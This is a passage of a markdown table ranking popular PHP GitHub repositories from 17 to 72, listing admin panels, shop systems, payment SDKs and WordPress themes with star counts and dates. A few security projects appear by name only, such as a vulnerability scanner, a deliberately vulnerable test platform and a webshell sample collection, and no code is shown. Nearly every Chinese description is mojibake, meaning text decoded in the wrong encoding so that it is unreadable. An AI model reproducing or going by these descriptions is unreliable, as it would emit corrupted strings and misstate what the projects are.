|17|[jqhph/dcat-admin](https://github.com/jqhph/dcat-admin)|üî•  ‰ΩøÁî®ÂæàÂ∞ëÁöÑ‰ª£Á†ÅÂø´ÈÄüÊûÑÂª∫‰∏Ä‰∏™ÂäüËÉΩÂÆåÂñÑÁöÑÈ´òÈ¢úÂÄºÂêéÂè∞Á≥ªÁªüÔºåÂÜÖÁΩÆ‰∏∞ÂØåÁöÑÂêéÂè∞Â∏∏Áî®ÁªÑ‰ª∂ÔºåÂºÄÁÆ±Âç≥Áî®ÔºåËÆ©ÂºÄÂèëËÄÖÂëäÂà´ÂÜóÊùÇÁöÑHTML‰ª£Á†Å„ÄÇ|1.9k|PHP|10/29|
|18|[privacy-protection-tools/anti-AD](https://github.com/privacy-protection-tools/anti-AD)|Ëá¥Âäõ‰∫éÊàê‰∏∫‰∏≠ÊñáÂå∫ÂëΩ‰∏≠ÁéáÊúÄÈ´òÁöÑÂπøÂëäËøáÊª§ÂàóË°®ÔºåÂÆûÁé∞Á≤æÁ°ÆÁöÑÂπøÂëäÂ±èËîΩÂíåÈöêÁßÅ‰øùÊä§„ÄÇanti-ADÁé∞Â∑≤ÊîØÊåÅAdGuardHomeÔºådnsmasqÔºå SurgeÔºåPi-HoleÔºåsmartdnsÁ≠âÁΩëÁªúÁªÑ‰ª∂„ÄÇÂÆåÂÖ®ÂÖºÂÆπÂ∏∏ËßÅÁöÑÂπøÂëäËøáÊª§Â∑•ÂÖ∑ÊâÄÊîØÊåÅÁöÑÂêÑÁßçÂπøÂëäËøáÊª§ÂàóË°®Ê†ºÂºè|1.8k|PHP|10/28|
|19|[zoujingli/ThinkAdmin](https://github.com/zoujingli/ThinkAdmin)|Âü∫‰∫é ThinkPHP Âü∫Á°ÄÂºÄÂèëÂπ≥Âè∞ÔºàÁôªÂΩïË¥¶Âè∑ÂØÜÁ†ÅÈÉΩÊòØ admin Ôºâ|1.7k|PHP|10/29|
|20|[matyhtf/webim](https://github.com/matyhtf/webim)|‰ΩøÁî®PHP+SwooleÂÆûÁé∞ÁöÑÁΩëÈ°µÂç≥Êó∂ËÅäÂ§©Â∑•ÂÖ∑|1.7k|PHP|07/23|
|21|[mashirozx/Sakura](https://github.com/mashirozx/Sakura)|A Wonderful WordPress Theme: Ê®±Ëä±Â∫ÑÁöÑÁôΩÁå´ÂçöÂÆ¢‰∏ªÈ¢ò|1.7k|PHP|10/20|
|22|[hui-ho/WebStack-Laravel](https://github.com/hui-ho/WebStack-Laravel)|‰∏Ä‰∏™ÂºÄÊ∫êÁöÑÁΩëÂùÄÂØºËà™ÁΩëÁ´ôÈ°πÁõÆÔºåÊÇ®ÂèØ‰ª•ÊãøÊù•Âà∂‰ΩúËá™Â∑±ÁöÑÁΩëÂùÄÂØºËà™„ÄÇ|1.5k|PHP|09/10|
|23|[louislivi/SMProxy](https://github.com/louislivi/SMProxy)|Swoole MySQL Proxy ‰∏Ä‰∏™Âü∫‰∫é MySQL ÂçèËÆÆÔºåSwoole ÂºÄÂèëÁöÑMySQLÊï∞ÊçÆÂ∫ìËøûÊé•Ê±†„ÄÇ A MySQL database connection pool based on MySQL protocol and Swoole.|1.5k|PHP|04/23|
|24|[Tai7sy/card-system](https://github.com/Tai7sy/card-system)|Âç°ÂØÜÂïÜÂüéÁ≥ªÁªüÔºåÈ´òÊïàÂÆâÂÖ®ÁöÑÂú®Á∫øÂç°ÂØÜÂïÜÂüé|1.5k|PHP|09/12|
|25|[gongfuxiang/shopxo](https://github.com/gongfuxiang/shopxo)|ShopXOÂÖçË¥πÂºÄÊ∫êÂïÜÂüéÁ≥ªÁªü„ÄÅÂõΩÂÜÖÈ¢ÜÂÖà‰ºÅ‰∏öÁ∫ßB2CÂÖçË¥πÂºÄÊ∫êÁîµÂïÜÁ≥ªÁªüÔºåÂåÖÂê´PC„ÄÅh5„ÄÅÂæÆ‰ø°Â∞èÁ®ãÂ∫è„ÄÅÊîØ‰ªòÂÆùÂ∞èÁ®ãÂ∫è„ÄÅÁôæÂ∫¶Â∞èÁ®ãÂ∫è„ÄÅÂ§¥Êù°&ÊäñÈü≥Â∞èÁ®ãÂ∫è„ÄÅQQÂ∞èÁ®ãÂ∫èÔºåÈÅµÂæ™Apache2ÂºÄÊ∫êÂçèËÆÆÂèëÂ∏É„ÄÅÂü∫‰∫éThinkPHP5.1Ê°ÜÊû∂Á†îÂèë|1.4k|PHP|10/29|
|26|[zorlan/skycaiji](https://github.com/zorlan/skycaiji)|ËìùÂ§©ÈááÈõÜÂô®ÊòØ‰∏ÄÊ¨æÂÖçË¥πÁöÑÊï∞ÊçÆÈááÈõÜÂèëÂ∏ÉÁà¨Ëô´ËΩØ‰ª∂ÔºåÈááÁî®php+mysqlÂºÄÂèëÔºåÂèØÈÉ®ÁΩ≤Âú®‰∫ëÊúçÂä°Âô®ÔºåÂá†‰πéËÉΩÈááÈõÜÊâÄÊúâÁ±ªÂûãÁöÑÁΩëÈ°µÔºåÊó†ÁºùÂØπÊé•ÂêÑÁ±ªCMSÂª∫Á´ôÁ®ãÂ∫èÔºåÂÖçÁôªÂΩïÂÆûÊó∂ÂèëÂ∏ÉÊï∞ÊçÆÔºåÂÖ®Ëá™Âä®Êó†ÈúÄ‰∫∫Â∑•Âπ≤È¢ÑÔºÅÊòØÂ§ßÊï∞ÊçÆ„ÄÅ‰∫ëÊó∂‰ª£ÁΩëÁ´ôÊï∞ÊçÆËá™Âä®ÂåñÈááÈõÜÁöÑÊúÄ‰Ω≥‰∫ëÁ´ØÁà¨Ëô´ËΩØ‰ª∂|1.4k|PHP|07/21|
|27|[hightman/xunsearch](https://github.com/hightman/xunsearch)|ÂÖçË¥πÂºÄÊ∫êÁöÑ‰∏≠ÊñáÊêúÁ¥¢ÂºïÊìéÔºåÈááÁî® C/C++ ÁºñÂÜô (Âü∫‰∫é xapian Âíå scws)ÔºåÊèê‰æõ PHP ÁöÑÂºÄÂèëÊé•Âè£Âíå‰∏∞ÂØåÊñáÊ°£|1.4k|PHP|09/04|
|28|[jianyan74/rageframe2](https://github.com/jianyan74/rageframe2)|‰∏Ä‰∏™Âü∫‰∫éYii2È´òÁ∫ßÊ°ÜÊû∂ÁöÑÂø´ÈÄüÂºÄÂèëÂ∫îÁî®ÂºïÊìé|1.3k|PHP|09/14|
|29|[TideSec/WDScanner](https://github.com/TideSec/WDScanner)|WDScannerÂπ≥Âè∞ÁõÆÂâçÂÆûÁé∞‰∫ÜÂ¶Ç‰∏ãÂäüËÉΩÔºöÂàÜÂ∏ÉÂºèwebÊºèÊ¥ûÊâ´Êèè„ÄÅÂÆ¢Êà∑ÁÆ°ÁêÜ„ÄÅÊºèÊ¥ûÂÆöÊúüÊâ´Êèè„ÄÅÂ≠êÂüüÂêçÊûö‰∏æ„ÄÅÁ´ØÂè£Êâ´Êèè„ÄÅÁΩëÁ´ôÁà¨Ëô´„ÄÅÊöóÈìæÊ£ÄÊµã„ÄÅÂùèÈìæÊ£ÄÊµã„ÄÅÁΩëÁ´ôÊåáÁ∫πÊêúÈõÜ„ÄÅ‰∏ìÈ°πÊºèÊ¥ûÊ£ÄÊµã„ÄÅ‰ª£ÁêÜÊêúÈõÜÂèäÈÉ®ÁΩ≤Á≠âÂäüËÉΩ„ÄÇ|1.3k|PHP|06/22|
|30|[mylxsw/wizard](https://github.com/mylxsw/wizard)|WizardÊòØ‰∏ÄÊ¨æÂºÄÊ∫êÁöÑÊñáÊ°£ÁÆ°ÁêÜÂ∑•ÂÖ∑ÔºåÊîØÊåÅMarkdown/Swagger/TableÁ±ªÂûãÁöÑÊñáÊ°£„ÄÇ|1.2k|PHP|10/29|
|31|[zhanghuanchong/icon-workshop](https://github.com/zhanghuanchong/icon-workshop)|ÂõæÊ†áÂ∑•Âú∫ - ÁßªÂä®Â∫îÁî®ÂõæÊ†áÁîüÊàêÂ∑•ÂÖ∑Ôºå‰∏ÄÈîÆÁîüÊàêÊâÄÊúâÂ∞∫ÂØ∏ÁöÑÂ∫îÁî®ÂõæÊ†áÂíåÂêØÂä®Âõæ|1.2k|PHP|08/30|
|32|[wususu/effective-resourses](https://github.com/wususu/effective-resourses)| :book:Â≠¶‰π†ËµÑÊ∫êÊï¥Âêà|1.2k|PHP|09/07|
|33|[assimon/dujiaoka](https://github.com/assimon/dujiaoka)|üöÄÁã¨ËßíÊï∞Âç°(ÂèëÂç°)-ÂºÄÊ∫êÂºèÁ´ôÈïøËá™Âä®ÂåñÂîÆË¥ßËß£ÂÜ≥ÊñπÊ°à„ÄÅÈ´òÊïà„ÄÅÁ®≥ÂÆö„ÄÅÂø´ÈÄüÔºÅüéâüéâ|1.2k|PHP|10/28|
|34|[SegmentFault/HyperDown](https://github.com/SegmentFault/HyperDown)|‰∏Ä‰∏™ÁªìÊûÑÊ∏ÖÊô∞ÁöÑÔºåÊòì‰∫éÁª¥Êä§ÁöÑÔºåÁé∞‰ª£ÁöÑPHP MarkdownËß£ÊûêÂô®|1.1k|PHP|10/29|
|35|[zhuifengshaonianhanlu/pikachu](https://github.com/zhuifengshaonianhanlu/pikachu)|‰∏Ä‰∏™Â•ΩÁé©ÁöÑWebÂÆâÂÖ®-ÊºèÊ¥ûÊµãËØïÂπ≥Âè∞|1.1k|PHP|10/02|
|36|[typecho-fans/plugins](https://github.com/typecho-fans/plugins)|Typecho FansÊèí‰ª∂‰ΩúÂìÅÁõÆÂΩï|1.1k|PHP|10/26|
|37|[EleTeam/Shop-PHP-Yii2](https://github.com/EleTeam/Shop-PHP-Yii2)|EleTeamÂºÄÊ∫êÈ°πÁõÆ-ÁîµÂïÜÂÖ®Â•óËß£ÂÜ≥ÊñπÊ°à‰πãPHPÁâà-Shop-for-PHP-Yii2„ÄÇ‰∏Ä‰∏™Á±ª‰ºº‰∫¨‰∏ú/Â§©Áå´/Ê∑òÂÆùÁöÑÂïÜÂüéÔºåÊúâÂØπÂ∫îÁöÑAPPÊîØÊåÅÔºåÁî±EleTeamÂõ¢ÈòüÁª¥Êä§ÔºÅ|1.1k|PHP|09/16|
|38|[fukuball/jieba-php](https://github.com/fukuball/jieba-php)|""ÁµêÂ∑¥""‰∏≠ÊñáÂàÜË©ûÔºöÂÅöÊúÄÂ•ΩÁöÑ PHP ‰∏≠ÊñáÂàÜË©û„ÄÅ‰∏≠ÊñáÊñ∑Ë©ûÁµÑ‰ª∂„ÄÇ / ""Jieba"" (Chinese for ""to stutter"") Chinese text segmentation: built to be the best PHP Chinese word segmentation module.|1.0k|PHP|04/16|
|39|[bowu678/php_bugs](https://github.com/bowu678/php_bugs)|PHP‰ª£Á†ÅÂÆ°ËÆ°ÂàÜÊÆµËÆ≤Ëß£|1.0k|PHP|07/12|
|40|[geesondog/rhaphp](https://github.com/geesondog/rhaphp)|RhaPHPÊòØÂæÆ‰ø°Á¨¨‰∏âÊñπÁÆ°ÁêÜÂπ≥Âè∞ÔºåÂæÆ‰ø°ÂÖ¨‰ºóÂè∑ÁÆ°ÁêÜÁ≥ªÁªüÔºåÊîØÊåÅÂ§öÂÖ¨‰ºóÂè∑ÁÆ°ÁêÜÔºåCRM‰ºöÂëòÁÆ°ÁêÜÔºåÂ∞èÁ®ãÂ∫èÂºÄÂèëÔºåAPPÊé•Âè£ÂºÄÂèë„ÄÅÂá†‰πéÈõÜÂêàÂæÆ‰ø°ÂäüËÉΩÔºåÁÆÄÊ¥Å„ÄÅÂø´ÈÄü‰∏äÊâã„ÄÅÂø´ÈÄüÂºÄÂèëÂæÆ‰ø°ÂêÑÁßçÂêÑÊ†∑Â∫îÁî®„ÄÇÁÆÄÊ¥Å„ÄÅÂ•ΩÁî®„ÄÅÂø´ÈÄü„ÄÅÈ°πÁõÆÂºÄÂèëÂø´Âá†ÂÄç „ÄÇ|1.0k|PHP|10/13|
|41|[MoeNetwork/Tieba-Cloud-Sign](https://github.com/MoeNetwork/Tieba-Cloud-Sign)|ÁôæÂ∫¶Ë¥¥Âêß‰∫ëÁ≠æÂà∞ÔºåÂú®ÊúçÂä°Âô®‰∏äÈÖçÁΩÆÂ•ΩÂ∞±Êó†ÈúÄËøõË°å‰ªª‰ΩïÊìç‰Ωú‰æøÂèØ‰ª•ÂÆûÁé∞Ë¥¥ÂêßÁöÑÂÖ®Ëá™Âä®Á≠æÂà∞„ÄÇÈÖçÂêàÊèí‰ª∂‰ΩøÁî®ËøòÂèØÂÆûÁé∞‰∫ëÁÅåÊ∞¥„ÄÅÁÇπËµû„ÄÅÂ∞ÅÁ¶Å„ÄÅÂà†Â∏ñ„ÄÅÂÆ°Êü•Á≠âÂäüËÉΩ |999|PHP|02/20|
|42|[overtrue/api.yike.io](https://github.com/overtrue/api.yike.io)|‰∏ÄÂàªÁ§æÂå∫ÂêéÁ´Ø API Ê∫êÁ†Å|987|PHP|05/09|
|43|[Leslin/thinkphp5-restfulapi](https://github.com/Leslin/thinkphp5-restfulapi)|restful-apiÈ£éÊ†ºÊé•Âè£ APPÊé•Âè£ APPÊé•Âè£ÊùÉÈôê  oauth2.0 Êé•Âè£ÁâàÊú¨ÁÆ°ÁêÜ Êé•Âè£Èâ¥ÊùÉ|932|PHP|09/27|
|44|[zoujingli/WeChatDeveloper](https://github.com/zoujingli/WeChatDeveloper)|„ÄêÊñ∞„ÄëÂæÆ‰ø°ÊúçÂä°Âè∑+ÂæÆ‰ø°Â∞èÁ®ãÂ∫è+ÂæÆ‰ø°ÊîØ‰ªò+ÊîØ‰ªòÂÆùÊîØ‰ªò|887|PHP|09/13|
|45|[jitamin/jitamin](https://github.com/jitamin/jitamin)|:panda_face: Jitamin is a free software written in PHP, intended to handle the project management over the web. QQÁæ§: 656868|886|PHP|06/29|
|46|[dedemao/alipay](https://github.com/dedemao/alipay)|‰∏Ä‰∏™PHPÊñá‰ª∂ÊêûÂÆöÊîØ‰ªòÂÆùÊîØ‰ªòÁ≥ªÂàóÔºåÂåÖÊã¨ÁîµËÑëÁΩëÁ´ôÊîØ‰ªòÔºåÊâãÊú∫ÁΩëÁ´ôÊîØ‰ªòÔºåÁé∞ÈáëÁ∫¢ÂåÖ„ÄÅÊ∂àË¥πÁ∫¢ÂåÖ„ÄÅÊâ´Á†ÅÊîØ‰ªòÔºåJSAPIÊîØ‰ªò„ÄÅÂçïÁ¨îËΩ¨Ë¥¶Âà∞ÊîØ‰ªòÂÆùË¥¶Êà∑„ÄÅ‰∫§ÊòìÁªìÁÆóÔºàÂàÜË¥¶„ÄÅÂàÜÊ∂¶Ôºâ„ÄÅÁΩëÈ°µÊéàÊùÉËé∑ÂèñÁî®Êà∑‰ø°ÊÅØÁ≠â|864|PHP|10/26|
|47|[swlib/saber](https://github.com/swlib/saber)|‚öîÔ∏è Saber, PHPÂºÇÊ≠•ÂçèÁ®ãHTTPÂÆ¢Êà∑Á´Ø   PHP Coroutine HTTP client - Swoole Humanization Library|825|PHP|09/02|
|48|[yansongda/laravel-pay](https://github.com/yansongda/laravel-pay)|ÂèØËÉΩÊòØÊàëÁî®ËøáÁöÑÊúÄ‰ºòÈõÖÁöÑ Alipay Âíå WeChat ÁöÑ laravel ÊîØ‰ªòÊâ©Â±ïÂåÖ‰∫Ü|823|PHP|09/10|
|49|[peinhu/AetherUpload-Laravel](https://github.com/peinhu/AetherUpload-Laravel)|A Laravel package to upload large files  ‰∏ä‰º†Â§ßÊñá‰ª∂ÁöÑLaravelÊâ©Â±ïÂåÖ|814|PHP|09/21|
|50|[dedemao/weixinPay](https://github.com/dedemao/weixinPay)|ÂæÆ‰ø°ÊîØ‰ªòÂçïÊñá‰ª∂Áâà„ÄÇ‰∏Ä‰∏™PHPÊñá‰ª∂ÊêûÂÆöÂæÆ‰ø°ÊîØ‰ªòÁ≥ªÂàó„ÄÇÂåÖÊã¨ÂéüÁîüÊîØ‰ªòÔºàÊâ´Á†ÅÊîØ‰ªòÔºâÔºåH5ÊîØ‰ªòÔºåÂÖ¨‰ºóÂè∑ÊîØ‰ªòÔºåÁé∞ÈáëÁ∫¢ÂåÖ„ÄÅ‰ºÅ‰∏ö‰ªòÊ¨æÂà∞Èõ∂Èí±Á≠â„ÄÇÊñ∞Â¢ûV3Áâà„ÄÇ|793|PHP|06/06|
|51|[yuantuo666/baiduwp-php](https://github.com/yuantuo666/baiduwp-php)|PanDownloadÁΩëÈ°µÂ§çÂàªÁâà|780|PHP|10/21|
|52|[kevinyan815/Learning_Laravel_Kernel](https://github.com/kevinyan815/Learning_Laravel_Kernel)|LaravelÊ†∏ÂøÉ‰ª£Á†ÅÂ≠¶‰π†|771|PHP|09/23|
|53|[xiebruce/PicUploader](https://github.com/xiebruce/PicUploader)|‰∏Ä‰∏™Ëøò‰∏çÈîôÁöÑÂõæÂ∫äÂ∑•ÂÖ∑ÔºåÊîØÊåÅMac/Win/LinuxÊúçÂä°Âô®„ÄÅÊîØÊåÅÂéãÁº©Âêé‰∏ä‰º†„ÄÅÊ∑ªÂä†ÂõæÁâáÊàñÊñáÂ≠óÊ∞¥Âç∞„ÄÅÂ§öÊñá‰ª∂ÂêåÊó∂‰∏ä‰º†„ÄÅÂêåÊó∂‰∏ä‰º†Âà∞Â§ö‰∏™‰∫ë„ÄÅÂè≥Âáª‰ªªÊÑèÊñá‰ª∂‰∏ä‰º†„ÄÅÂø´Êç∑ÈîÆ‰∏ä‰º†Ââ™Ë¥¥ÊùøÊà™Âõæ„ÄÅWebÁâà‰∏ä‰º†„ÄÅÊîØÊåÅ‰Ωú‰∏∫Mweb/TyporaÂèëÂ∏ÉÂõæÁâáÊé•Âè£„ÄÅ‰Ωú‰∏∫PicGo/ShareX/uPicÁ≠âÁöÑËá™ÂÆö‰πâÂõæÂ∫äÔºåÊîØÊåÅÂú®ÊúçÂä°Âô®‰∏äÈÉ®ÁΩ≤‰Ωú‰∏∫ÂõæÂ∫äÊé•Âè£ÔºåÊîØÊåÅ‰∏ä‰º†‰ªªÊÑèÊ†ºÂºèÊñá‰ª∂„ÄÇ|766|PHP|10/05|
|54|[magicblack/maccms10](https://github.com/magicblack/maccms10)|ËãπÊûúcms-v10,maccms-v10,ÂºÄÊ∫êCMS,ÂÜÖÂÆπÁÆ°ÁêÜÁ≥ªÁªü,ËßÜÈ¢ëÂàÜ‰∫´Á®ãÂ∫è,ÂàÜÈõÜÂâßÊÉÖÁ®ãÂ∫è,ÁΩëÂùÄÂØºËà™Á®ãÂ∫è,Êñ∞ÈóªÁ®ãÂ∫è,Êº´ÁîªÁ®ãÂ∫è,ÂõæÁâáÁ®ãÂ∫è|739|PHP|10/26|
|55|[lizhichao/one](https://github.com/lizhichao/one)|‰∏Ä‰∏™ÊûÅÁÆÄÈ´òÊÄßËÉΩphpÊ°ÜÊû∂ÔºåÊîØÊåÅ[swoole   php-fpm ]ÁéØÂ¢É|736|PHP|10/29|
|56|[wmhello/laravel_template_with_vue](https://github.com/wmhello/laravel_template_with_vue)|laravel5.5Âíåvue.jsÁªìÂêàÁöÑÂâçÂêéÁ´ØÂàÜÁ¶ªÈ°πÁõÆÊ®°Êùø,ÂêéÁ´Ø‰ΩøÁî®‰∫ÜlaravelÁöÑLTSÁâàÊú¨Ôºà5.5ÔºâÔºåÂâçÁ´Ø‰ΩøÁî®‰∫ÜÊµÅË°åÁöÑvue-element-templateÈ°πÁõÆ„ÄÇ‰Ωú‰∏∫Á®ãÂ∫èÁöÑËµ∑ÁÇπÔºåÂèØ‰ª•Áõ¥Êé•‰ª•Ê≠§‰∏∫Âü∫Á°ÄÊù•ËøõË°å‰∏öÂä°Êâ©Â±ï„ÄÇÊ®°ÊùøÂÜÖÂÆπÂåÖÊã¨Âü∫Á°ÄÁöÑÁî®Êà∑ÁÆ°ÁêÜÂíåÊùÉÈôêÁÆ°ÁêÜ„ÄÅÊó•ÂøóÁÆ°ÁêÜ„ÄÅÈõÜÊàêÁ¨¨‰∏âÊñπÁôªÂΩïÔºåÊï¥Âêàlaravel-echo-server ÂÆûÁé∞‰∫Üwebsocket ÂÅöÂà∞‰∫ÜÊ∂àÊÅØÁöÑÂÆûÊó∂Êé®ÈÄÅÔºåÂπ∂Âú®Ê≠§Âü∫Á°Ä‰∏äÔºåÂÆûÁé∞‰∫ÜËÅäÂ§©ÂÆ§ÂíåÂÆ¢ÊúçÂäüËÉΩ„ÄÇÊùÉÈôêÁÆ°ÁêÜÂåÖÊã¨ÂêéÁ´ØTokenËÆ§ËØÅÂíåÂâçÁ´Øvue.jsÁöÑÂä®ÊÄÅÊùÉÈôêÔºåËß£ÂÜ≥‰∫ÜÂâçÂêéÁ´ØÂÆåÊï¥ÂàÜÁ¶ªÁöÑÊÉÖÂÜµ‰∏ãÔºåvue.jsÁöÑËÆ§ËØÅ‰∏éÊùÉÈôêÁõ∏ÂÖ≥ÁöÑÁóõÁÇπÔºåÂ∑≤Âú®Êú¨‰∫∫ÁöÑÂ§ö‰∏™È°πÁõÆ‰∏≠ÈõÜÊàê‰ΩøÁî®„ÄÇ|734|PHP|09/10|
|57|[iqiqiya/iqiqiya-API](https://github.com/iqiqiya/iqiqiya-API)|APIÊé•Âè£Â§ßÂÖ®‰∏çÊñ≠Êõ¥Êñ∞‰∏≠~Ê¨¢ËøéForkÂíåStar(‚úé 1.‰∏ÄË®Ä(Âè§ËØóÂè•Áâà)api  ‚úé 2.ÂøÖÂ∫îÊØèÊó•‰∏ÄÂõæapi  ‚úé 3.Âú®Á∫øipÊü•ËØ¢  ‚úé 4.m3u8ËßÜÈ¢ëÂú®Á∫øËß£Êûêapi  ‚úé 5.ÈöèÊú∫ÁîüÊàê‰∫åÊ¨°ÂÖÉÂõæÁâáapi  ‚úé 6.Âø´ÈÄíÊü•ËØ¢api-ÊîØÊåÅÂõΩÂÜÖÁôæÂÆ∂Âø´ÈÄí  ‚úé 7.flvËßÜÈ¢ëÂú®Á∫øËß£Êûêapi ‚úé 8.ÊäñÈü≥ËßÜÈ¢ëÊó†Ê∞¥Âç∞Ëß£Êûêapi‚úé 9.‰∏ÄÂè•ËØùÈöèÊú∫ÂõæÁâáapi‚úé 10.QQÁî®Êà∑‰ø°ÊÅØËé∑Âèñapi‚úé11.ÂìîÂì©ÂìîÂì©Â∞ÅÈù¢ÂõæËé∑Âèñapi‚úé12.ÂçÉÂõæÁΩë58picÊó†Ê∞¥Âç∞Ëß£Êûê‰∏ãËΩΩapi‚úé13.ÂñúÈ©¨ÊãâÈõÖ‰∏ªÊí≠FMÊï∞ÊçÆÈááÈõÜapi‚úé14.ÁΩëÊòì‰∫ëÈü≥‰πêapi‚úé15.CCTVÂ§ÆËßÜÁΩëËßÜÈ¢ëËß£Êûêapi‚úé16.ÂæÆ‰ø°ËøêÂä®Âà∑Ê≠•Êï∞api‚úé17.ÁöÆÁöÆÊêûÁ¨ë ...|734|PHP|06/01|
|58|[solstice23/argon-theme](https://github.com/solstice23/argon-theme)|üìñ Argon - ‰∏Ä‰∏™ËΩªÁõà„ÄÅÁÆÄÊ¥ÅÁöÑ WordPress ‰∏ªÈ¢ò|729|PHP|10/25|
|59|[duoergun0729/1book](https://github.com/duoergun0729/1book)|„ÄäWebÂÆâÂÖ®‰πãÊú∫Âô®Â≠¶‰π†ÂÖ•Èó®„Äã|719|PHP|02/23|
|60|[insoxin/API](https://github.com/insoxin/API)|Âß¨Èïø‰ø°API For Docker ‰∏Ä‰∏™Âü∫‰∫éÂ§öÁßçÁºñÁ®ãËØ≠Ë®ÄÂºÄÊ∫êÂÖçË¥π‰∏çÈôêÂà∂Êèê‰æõÁîüÊ¥ªÂ∏∏Áî®,Âá∫Ë°åÊúçÂä°,ÂºÄÂèëÂ∑•ÂÖ∑,ÈáëËûçÊúçÂä°,ÈÄöËÆØÊúçÂä°ÂíåÂÖ¨ÁõäÂ§ßÊï∞ÊçÆÁöÑÂπ≥Âè∞.|699|PHP|07/06|
|61|[Yurunsoft/PaySDK](https://github.com/Yurunsoft/PaySDK)|PHP ÈõÜÊàêÊîØ‰ªò SDK ÔºåÈõÜÊàê‰∫ÜÊîØ‰ªòÂÆù„ÄÅÂæÆ‰ø°ÊîØ‰ªòÁöÑÊîØ‰ªòÊé•Âè£ÂíåÂÖ∂ÂÆÉÁõ∏ÂÖ≥Êé•Âè£ÁöÑÊìç‰Ωú„ÄÇÊîØÊåÅ php-fpm Âíå SwooleÔºåÊâÄÊúâÊ°ÜÊû∂ÈÄöÁî®„ÄÇÂÆáÊ∂¶PHPÂÖ®ÂÆ∂Ê°∂ÊäÄÊúØÊîØÊåÅÁæ§Ôºö17916227|686|PHP|08/19|
|62|[itbdw/ip-database](https://github.com/itbdw/ip-database)|üì°ÂÖçË¥πIPÊï∞ÊçÆÂ∫ì (Á∫ØÁúüIPÂ∫ìÔºåÂ∑≤ÁªèÊ†ºÂºè‰∏∫ÂõΩÂÆ∂„ÄÅÁúÅ„ÄÅÂ∏Ç„ÄÅÂéø„ÄÅËøêËê•ÂïÜ)‚ù§Ô∏è üá®üá≥Ôºå‰∏≠ÊñáÊï∞ÊçÆÂ∫ìÔºåÊñπ‰æøÂÆûÁî®|630|PHP|10/14|
|63|[luolongfei/freenom](https://github.com/luolongfei/freenom)|FreenomÂüüÂêçËá™Âä®Áª≠Êúü„ÄÇFreenom domain name renews automatically.|630|PHP|10/25|
|64|[Yurunsoft/imi](https://github.com/Yurunsoft/imi)|imi ÊòØÂü∫‰∫é Swoole ÁöÑ PHP ÂçèÁ®ãÂºÄÂèëÊ°ÜÊû∂ÔºåÂÆÉÊîØÊåÅ Http„ÄÅHttp2„ÄÅWebSocket„ÄÅTCP„ÄÅUDP„ÄÅMQTT Á≠â‰∏ªÊµÅÂçèËÆÆÁöÑÊúçÂä°ÂºÄÂèëÔºåÁâπÂà´ÈÄÇÂêà‰∫íËÅîÁΩëÂæÆÊúçÂä°„ÄÅÂç≥Êó∂ÈÄöËÆØËÅäÂ§©im„ÄÅÁâ©ËÅîÁΩëÁ≠âÂú∫ÊôØÔºÅ„ÄÇQQÁæ§Ôºö17916227|616|PHP|10/29|
|65|[zencodex/composer-mirror](https://github.com/zencodex/composer-mirror)|Composer ÂÖ®ÈáèÈïúÂÉèÂèëÂ∏É‰∫é2017Âπ¥3ÊúàÔºåËá≥‰ªäÂ∑≤‰∏çÈó¥Êñ≠ËøêË°å2Âπ¥Â§ö„ÄÇËøô‰∏™ÂºÄÊ∫êÊúâÂä©‰∫éÁêÜËß£ Composer ÈïúÂÉèÁöÑÂ∑•‰ΩúÂéüÁêÜ|604|PHP|10/19|
|66|[ysrc/webshell-sample](https://github.com/ysrc/webshell-sample)|Êî∂ÈõÜËá™ÁΩëÁªúÂêÑÂ§ÑÁöÑ webshell Ê†∑Êú¨ÔºåÁî®‰∫éÊµãËØï webshell Êâ´ÊèèÂô®Ê£ÄÊµãÁéá„ÄÇ|601|PHP|10/01|
|67|[wanglelecc/laracms](https://github.com/wanglelecc/laracms)|LaraCMS ÊòØÂú®Â≠¶‰π† laravel Ôºà web ÂºÄÂèëÂÆûÊàòËøõÈò∂ + ÂÆûÊàòÊûÑÊû∂ API ÊúçÂä°Âô®Ôºâ ËøáÁ®ã‰∏≠‰∫ßÁîüÁöÑ‰∏Ä‰∏™‰∏ö‰Ωô‰ΩúÂìÅÔºåËØïÂõæÈÄöËøáÁÆÄÂçïÁöÑÊñπÂºèÔºåÂø´ÈÄüÊûÑÂª∫‰∏ÄÂ•óÂü∫Êú¨ÁöÑ‰ºÅ‰∏öÁ´ôÂêåÊó∂‰øùÁïôÂæàÁÅµÊ¥ªÁöÑÊâ©Â±ïËÉΩÂäõÂíå‰ºòÈõÖÁöÑ‰ª£Á†ÅÊñπÂºèÔºåÂΩìÁÑ∂Ëøô‰∫õÈÉΩÂæóÁõäLaravelÁöÑ‰ºòÁßÄËÆæËÆ°„ÄÇÂêåÊó∂LaraCMS ‰πüÊòØ‰∏Ä‰∏™Â≠¶‰π†Laravel ‰∏çÈîôÁöÑÂèÇËÄÉÁ§∫‰æã„ÄÇ|575|PHP|06/06|
|68|[72crm/72crm](https://github.com/72crm/72crm)|ÊÇüÁ©∫CRM-Âü∫‰∫éTP5.0+vue+ElementUIÁöÑÂâçÂêéÁ´ØÂàÜÁ¶ªCRMÁ≥ªÁªü|568|PHP|03/23|
|69|[fghrsh/live2d_api](https://github.com/fghrsh/live2d_api)|Live2D ÁúãÊùøÂ®òÊèí‰ª∂ (https://www.fghrsh.net/post/123.html) ‰∏ä‰ΩøÁî®ÁöÑÂêéÁ´Ø API|559|PHP|05/19|
|70|[letwang/HookPHP](https://github.com/letwang/HookPHP)|HookPHPÂü∫‰∫éCÊâ©Â±ïÊê≠Âª∫ÂÜÖÁΩÆAIÁºñÁ®ãÁöÑÊû∂ÊûÑÁ≥ªÁªü-ÊîØÊåÅÂæÆÊúçÂä°ÈÉ®ÁΩ≤ ÁÉ≠ÊèíÊãî‰∏öÂä°ÁªÑ‰ª∂-ÈõÜÊàê‰∏öÂä°Ê®°Âûã ÊùÉÈôêÊ®°Âûã UIÁªÑ‰ª∂Â∫ì Â§öÊ®°Êùø Â§öÂπ≥Âè∞ Â§öÂüüÂêç Â§öÁªàÁ´Ø Â§öËØ≠Ë®Ä-Âê´Â∏∏È©ªÂÜÖÂ≠ò ÂâçÂêéÂàÜÁ¶ª APIÂπ≥Âè∞ LUA QQÁæ§Ôºö679116380|559|PHP|07/14|
|71|[owen0o0/WebStack](https://github.com/owen0o0/WebStack)|WordPress Áâà WebStack ÂØºËà™‰∏ªÈ¢ò https://nav.iowen.cn|557|PHP|02/23|
|72|[zdhxiong/mdclub](https://github.com/zdhxiong/mdclub)|MDClub Á§æÂå∫Á≥ªÁªüÂêéÁ´Ø‰ª£Á†Å|556|PHP|10/29|
